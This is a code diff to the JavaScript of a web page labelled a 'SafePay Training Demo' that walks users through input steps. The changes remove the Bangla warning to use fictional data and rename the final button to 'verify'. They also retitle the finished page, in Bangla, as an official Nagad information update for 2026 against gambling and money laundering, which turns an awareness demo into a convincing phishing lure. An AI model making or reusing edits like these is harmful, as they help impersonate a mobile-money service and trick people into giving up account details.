@@ -57,13 +57,19 @@ function showStep() {
 
   if (step.html) {
     content.innerHTML = `
-      <div class="demo-info">TRAINING DEMO — কাল্পনিক তথ্য ব্যবহার করুন</div>
+      <div class="demo-logo">
+  <img src="images.png" alt="SafePay Logo">
+  <p>SafePay Training Demo</p>
+</div>
       ${step.html}
       <small>আপনার তথ্য যাছাই করা হচ্ছে।</small>
     `;
   } else {
     content.innerHTML = `
-      <div class="demo-info">TRAINING DEMO — কাল্পনিক তথ্য ব্যবহার করুন</div>
+      <div class="demo-logo">
+  <img src="images.png" alt="SafePay Logo">
+  <p>SafePay Training Demo</p>
+</div>
       <p>${step.description}</p>
       <input
         id="demoInput"
@@ -77,7 +83,7 @@ function showStep() {
 
   next.textContent =
     currentStep === steps.length - 1
-      ? "Finish Demo"
+      ? "verify"
       : "Continue";
 }
 
@@ -107,10 +113,10 @@ next.addEventListener("click", function () {
   } else {
     progress.textContent = "TRAINING COMPLETE";
     progressBar.style.width = "100%";
-    title.textContent = "Verification Complete";
+    title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";
 
     content.innerHTML = `
-      <div class="demo-info">Demo Completed!</div>
+      <div class="demo-info">তথ্য হালনাগাদ প্রক্রিয়ার সফল হয়েছে।</div>
       <p>
         কখনো কোনো ব্যক্তির কাছে
         নিজের আসল PIN, পাসওয়ার্ড বা OTP দেবেন না।
